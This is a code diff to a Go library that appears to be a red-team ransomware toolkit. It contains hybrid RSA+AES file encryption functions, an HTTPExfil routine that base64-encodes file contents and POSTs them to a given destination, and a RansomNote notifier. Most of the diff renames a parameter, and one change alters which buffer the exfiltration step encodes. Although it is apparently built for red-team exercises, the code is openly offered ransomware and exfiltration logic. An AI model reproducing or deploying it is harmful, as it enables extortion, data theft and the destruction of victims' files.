@@ -34,7 +34,7 @@ var DefaultNotify = func() error {
 // AESDecrypt will return a function pointer to an EncryptFunc that
 // actually decrypts using the specified password.
 func AESDecrypt(passwd string) EncryptFunc {
-	return func(fn string, b []byte) ([]byte, error) {
+	return func(path string, b []byte) ([]byte, error) {
 		var block cipher.Block
 		var e error
 		var iv [sha256.Size]byte = sha256.Sum256([]byte("redteam"))
@@ -67,7 +67,7 @@ func AESDecrypt(passwd string) EncryptFunc {
 // AESEncrypt will return a function pointer to an EncryptFunc that
 // uses the specified password.
 func AESEncrypt(passwd string) EncryptFunc {
-	return func(fn string, b []byte) ([]byte, error) {
+	return func(path string, b []byte) ([]byte, error) {
 		var block cipher.Block
 		var ctxt []byte
 		var e error
@@ -92,7 +92,7 @@ func AESEncrypt(passwd string) EncryptFunc {
 }
 
 // Base64Encode will "encrypt" using base64, obvs.
-func Base64Encode(fn string, b []byte) ([]byte, error) {
+func Base64Encode(path string, b []byte) ([]byte, error) {
 	return []byte(base64.StdEncoding.EncodeToString(b)), nil
 }
 
@@ -116,7 +116,7 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 			}
 
 			// Create request
-			b64 = base64.StdEncoding.EncodeToString(b)
+			b64 = base64.StdEncoding.EncodeToString(tmp[:])
 			req, e = http.NewRequest(
 				http.MethodPost,
 				dst,
@@ -170,7 +170,7 @@ func RansomNote(path string, text []string) NotifyFunc {
 // is used to decrypt an OTP used with AES for a hybrid RSA+AES
 // scheme.
 func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
-	return func(fn string, b []byte) ([]byte, error) {
+	return func(path string, b []byte) ([]byte, error) {
 		var b64 []byte
 		var final []byte
 		var e error
@@ -217,7 +217,7 @@ func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
 		}
 
 		// AES decrypt remaining contents using helper function
-		if ptxt, e = AESDecrypt(string(otp))(fn, final); e != nil {
+		if ptxt, e = AESDecrypt(string(otp))(path, final); e != nil {
 			return b, e
 		}
 
@@ -229,7 +229,7 @@ func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
 // uses the specified public key. The public key is used to encrypt an
 // OTP used with AES for a hybrid RSA+AES scheme.
 func RSAEncrypt(pub *rsa.PublicKey) EncryptFunc {
-	return func(fn string, b []byte) ([]byte, error) {
+	return func(path string, b []byte) ([]byte, error) {
 		var b64 []byte
 		var ctxt []byte
 		var e error
@@ -259,7 +259,7 @@ func RSAEncrypt(pub *rsa.PublicKey) EncryptFunc {
 		base64.StdEncoding.Encode(b64, key)
 
 		// AES encrypt using helper function
-		if ctxt, e = AESEncrypt(string(otp[:]))(fn, b); e != nil {
+		if ctxt, e = AESEncrypt(string(otp[:]))(path, b); e != nil {
 			return b, e
 		}
 
